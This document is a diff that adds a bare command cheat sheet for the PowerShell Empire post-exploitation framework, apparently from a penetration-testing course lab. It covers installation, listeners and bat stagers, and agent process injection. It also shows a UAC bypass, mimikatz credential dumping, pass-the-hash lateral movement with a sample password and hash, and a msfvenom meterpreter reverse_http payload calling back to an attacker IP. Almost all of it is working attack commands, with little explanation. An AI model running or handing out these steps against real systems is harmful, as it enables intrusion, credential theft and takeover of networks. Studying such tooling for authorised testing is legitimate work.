@@ -1,1 +1,221 @@
+Installation, Setup, and Usage
+
+kali@kali:~$ cd /opt
+
+kali@kali:/opt$ sudo git clone https://github.com/PowerShellEmpire/Empire.git
+
+kali@kali:/opt$ cd Empire/
+
+kali@kali:/opt/Empire$ sudo ./setup/install.sh
+
+kali@kali:/opt/Empire$ sudo ./empire
+
+
+
+
+
+
+PowerShell Empire Syntax
+
+(Empire) > help
+
+
+
+
+
+
+
+Listeners and Stagers 
+
+(Empire) > listeners
+
+(Empire: listeners) > uselistener
+
+(Empire: listeners) > uselistener http
+
+(Empire: listeners) > uselistener http
+
+(Empire: listeners/http) > info
+
+(Empire: listeners) > set Host 10.11.0.4
+
+(Empire: listeners/http) > execute
+
+(Empire: listeners/http) > back
+
+(Empire: listeners) > usestager
+
+(Empire: listeners) > usestager windows/launcher_bat
+
+(Empire: stager/windows/launcher_bat) > info
+
+Empire: stager/windows/launcher_bat) > set Listener http
+
+(Empire: stager/windows/launcher_bat) > execute
+
+kali@kali:/opt/Empire$ cat /tmp/launcher.bat
+
+
+
+
+
+
+
+
+
+The Empire Agent
+
+(Empire: stager/windows/launcher_bat) > agents
+
+(Empire: agents) > interact S2Y5XW1L
+
+(Empire: S2Y5XW1L) > sysinfo
+
+(Empire: S2Y5XW1L) > help
+
+(Empire: S2Y5XW1L) > ps
+
+(Empire: S2Y5XW1L) > psinject http 3568
+
+(Empire: DWZ49BAP) > agents
+
+(Empire: agents) > interact DWZ49BAP
+
+
+
+
+
+
+
+
+PowerShell Modules 
+(Empire: S2Y5XW1L) > usemodule
+
+
+
+
+
+
+Situational Awareness
+(Empire:2Y5XW1L) > usemodule situational_awareness/network/powerview/get_user
+
+(powershell/situational_awareness/network/powerview/get_user) > info
+
+> (powershell/situational_awareness/network/powerview/get_user) > execute
+
+
+
+
+
+
+
+
+
+Credentials and Privilege Escalation 
+
+(Empire: powershell/situational_awareness/network/powerview/get_user) > usemodule
+powershell/privesc/powerup/allchecks
+
+(Empire: powershell/privesc/powerup/allchecks) > execute
+
+(Empire: S2Y5XW1L) > usemodule privesc/bypassuac_fodhelper
+
+(Empire: powershell/privesc/bypassuac_fodhelper) > info
+
+(Empire: powershell/privesc/bypassuac_fodhelper) > set Listener http
+
+(Empire: powershell/privesc/bypassuac_fodhelper) > execute
+[>] Module is not opsec safe, run? [y/N] y
+
+(Empire: agents) > interact K678VC13
+
+(Empire: K678VC13) > usemodule credentials/
+
+(Empire: K678VC13) > usemodule credentials/mimikatz/logonpasswords
+
+(Empire: powershell/credentials/mimikatz/logonpasswords) > execute
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+
+(Empire: K678VC13) > creds
+
+(Empire: K678VC13) > creds add corp.com jeff_admin Qwerty09!
+
+
+
+
+
+
+
+
+Lateral Movement
+
+(Empire: K678VC13) > usemodule lateral_movement/technique
+
+(Empire: K678VC13) > usemodule lateral_movement/invoke_smbexec
+
+(Empire: powershell/lateral_movement/invoke_smbexec) > info
+
+(Empire: powershell/lateral_movement/invoke_smbexec) > set ComputerName client251
+
+(Empire: powershell/lateral_movement/invoke_smbexec) > set Listener http
+
+(Empire: powershell/lateral_movement/invoke_smbexec) > set Username jeff_admin
+
+(Empire: powershell/lateral_movement/invoke_smbexec) > set Hash
+e2b475c11da2a0748290d87aa966c327
+
+(Empire: powershell/lateral_movement/invoke_smbexec) > set Domain corp.com
+
+(Empire: powershell/lateral_movement/invoke_smbexec) > execute
+
+(Empire: K678VC13) > agents
+
+(Empire: agents) > interact UXVZ2NC3
+
+
+
+
+
+
+
+
+
+
+Switching Between Empire and Metasploit 
+
+kali@kali:~$ msfvenom -p windows/meterpreter/reverse_http LHOST=10.11.0.4 LPORT=7777 -
+f exe -o met.exe
+
+msf5 > use multi/handler
+
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
+
+msf5 exploit(multi/handler) > set LPORT 7777
+
+msf5 exploit(multi/handler) > set LHOST 10.11.0.4
+
+msf5 exploit(multi/handler) > exploit
+
+Empire: S2Y5XW1L) > upload /home/kali/met.exe
+
+Empire: S2Y5XW1L) > shell dir
+
+(Empire: S2Y5XW1L) > shell C:\Users\offsec.corp\Downloads>met.exe
+
+(Empire: listeners) > usestager windows/launcher_bat
+
+(Empire: stager/windows/launcher_bat) > set Listener http
+
+(Empire: stager/windows/launcher_bat) > execute
+
+meterpreter > upload /tmp/launcher.bat
+
+meterpreter > shell
+
+C:\Users\offsec.corp\Downloads>dir
+
+C:\Users\offsec.corp\Downloads>launcher.bat
+
+
 
